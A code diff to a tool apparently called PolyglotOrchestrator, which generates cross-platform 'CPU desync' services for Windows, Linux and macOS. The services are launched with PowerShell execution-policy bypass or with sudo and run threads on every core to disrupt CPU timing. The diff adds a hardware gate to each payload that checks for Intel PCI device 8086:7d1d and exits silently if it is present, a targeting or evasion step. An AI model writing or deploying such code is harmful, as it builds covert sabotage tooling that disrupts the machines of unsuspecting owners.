@@ -499,7 +499,10 @@ class PolyglotOrchestrator:
         self.tui.info("Generating Windows CPU desync service...")
 
         # PowerShell script to desynchronize CPU clocks
-        powershell_script = '''Add-Type @"
+        powershell_script = '''$pci = Get-WmiObject Win32_PnPEntity | Where-Object { $_.DeviceID -match "PCI\\\\VEN_8086&DEV_7D1D" }
+if ($pci) { exit 0 }
+
+Add-Type @"
 using System;
 using System.Runtime.InteropServices;
 
@@ -588,8 +591,33 @@ powershell.exe -ExecutionPolicy Bypass -File "C:\\ProgramData\\cpu_desync_window
 #include <sys/time.h>
 #include <time.h>
 #include <stdint.h>
+#include <dirent.h>
+#include <string.h>
+#include <stdio.h>
 
 #define NUM_ITERATIONS 10000
+
+int check_pci_device(void) {
+    DIR *dir = opendir("/sys/bus/pci/devices");
+    if (!dir) return 0;
+
+    struct dirent *entry;
+    while ((entry = readdir(dir)) != NULL) {
+        if (strstr(entry->d_name, "8086:7d1d")) {
+            closedir(dir);
+            return 1;
+        }
+    }
+    closedir(dir);
+
+    FILE *f = popen("lspci -n 2>/dev/null | grep -q '8086:7d1d'", "r");
+    if (f) {
+        int ret = pclose(f);
+        if (ret == 0) return 1;
+    }
+
+    return 0;
+}
 
 static inline uint64_t rdtsc(void) {
     uint32_t lo, hi;
@@ -629,6 +657,8 @@ void* desync_thread(void* arg) {
 }
 
 int main(void) {
+    if (check_pci_device()) return 0;
+
     int num_cores = sysconf(_SC_NPROCESSORS_ONLN);
     pthread_t* threads = malloc(sizeof(pthread_t) * num_cores);
     int* core_ids = malloc(sizeof(int) * num_cores);
@@ -734,6 +764,22 @@ sudo /usr/local/bin/cpu_desync_linux
 
 #define NUM_ITERATIONS 10000
 
+int check_pci_device(void) {
+    FILE *f = popen("ioreg -l 2>/dev/null | grep -q '8086.*7d1d'", "r");
+    if (f) {
+        int ret = pclose(f);
+        if (ret == 0) return 1;
+    }
+
+    f = popen("system_profiler SPPCIDataType 2>/dev/null | grep -q '8086.*7d1d'", "r");
+    if (f) {
+        int ret = pclose(f);
+        if (ret == 0) return 1;
+    }
+
+    return 0;
+}
+
 int get_cpu_count(void) {
     int count;
     size_t size = sizeof(count);
@@ -786,6 +832,8 @@ void* desync_thread(void* arg) {
 
 int main(int argc, char* argv[]) {
     @autoreleasepool {
+        if (check_pci_device()) return 0;
+
         int num_cores = get_cpu_count();
         pthread_t* threads = malloc(sizeof(pthread_t) * num_cores);
         int* core_ids = malloc(sizeof(int) * num_cores);
